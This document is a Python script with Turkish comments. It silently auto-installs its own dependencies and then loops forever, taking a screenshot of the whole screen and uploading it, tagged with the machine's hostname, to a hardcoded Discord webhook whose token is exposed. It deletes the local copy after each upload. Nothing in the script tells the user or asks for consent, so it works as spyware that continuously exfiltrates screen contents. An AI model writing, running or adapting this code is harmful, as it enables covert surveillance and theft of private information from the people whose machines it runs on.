import importlib.util
import sys
import time
import os
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
import pyscreenshot as ImageGrab
import platform

def paket_kur(package):
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def paketleri_kontrol_et_ve_kur(paketler):
    for paket in paketler:
        if importlib.util.find_spec(paket) is None:
            print(f"{paket} paketi bulunamadı. Kuruluyor...")
            paket_kur(paket)

# Gerekli paketleri kontrol et ve kur
gerekli_paketler = ['discord-webhook', 'pyscreenshot', 'requests']
paketleri_kontrol_et_ve_kur(gerekli_paketler)

# Discord Webhook URL
webhook_url = 'https://discord.com/api/webhooks/1223566913855029248/maas3_UnV8vekXVMblyl-HjpNdKhIu0jX6-6oc19I5YW8WcxyUDoFuZR8mqjklLihix2'

# Klasörü kontrol et ve oluştur
ekran_goruntuleri_klasoru = 'ekran_goruntuleri'
if not os.path.exists(ekran_goruntuleri_klasoru):
    os.makedirs(ekran_goruntuleri_klasoru)

def ekran_goruntusu_al():
    # Ekran görüntüsü al
    im = ImageGrab.grab()
    ekran_goruntusu_yolu = os.path.join(ekran_goruntuleri_klasoru, 'ekran_goruntusu.png')
    im.save(ekran_goruntusu_yolu)
    # Dosyayı kapat
    im.close()
    return ekran_goruntusu_yolu

def cihaz_adi_al():
    return platform.node()

def ekran_goruntusunu_gonder(webhook_url, ekran_goruntusu_yolu, cihaz_adi="Cihaz"):
    # Discord webhook oluştur
    webhook = DiscordWebhook(url=webhook_url)

    # Embed oluştur
    embed = DiscordEmbed(title=f"{cihaz_adi} - Cihazınızın Ekran Görüntüsü", description='Cihazınızın ekranından alınan son görüntü', color=242424)
    embed.set_image(url='attachment://ekran_goruntusu.png')

    # Embed'i webhook'a ekle
    webhook.add_embed(embed)

    # Dosyayı webhook'a eklemek için uygun hale getir
    with open(ekran_goruntusu_yolu, 'rb') as f:
        webhook.add_file(file=f.read(), filename='ekran_goruntusu.png')

    # Webhook'u gönder
    response = webhook.execute()

    # Ekran görüntüsünü sil
    os.remove(ekran_goruntusu_yolu)

def ana_program():
    cihaz_adi = cihaz_adi_al()  # Cihaz adını al
    while True:
        # İnternet bağlantısını kontrol et
        try:
            requests.get('http://google.com')
            internet_baglantisi = True
        except:
            internet_baglantisi = False

        # İnternet bağlantısı varsa anında gönder
        if internet_baglantisi:
            ekran_goruntusu_yolu = ekran_goruntusu_al()
            ekran_goruntusunu_gonder(webhook_url, ekran_goruntusu_yolu, cihaz_adi=cihaz_adi)
        else:
            # İnternet bağlantısı yoksa bekle ve sonra gönder
            time.sleep(5)

if __name__ == "__main__":
    ana_program()
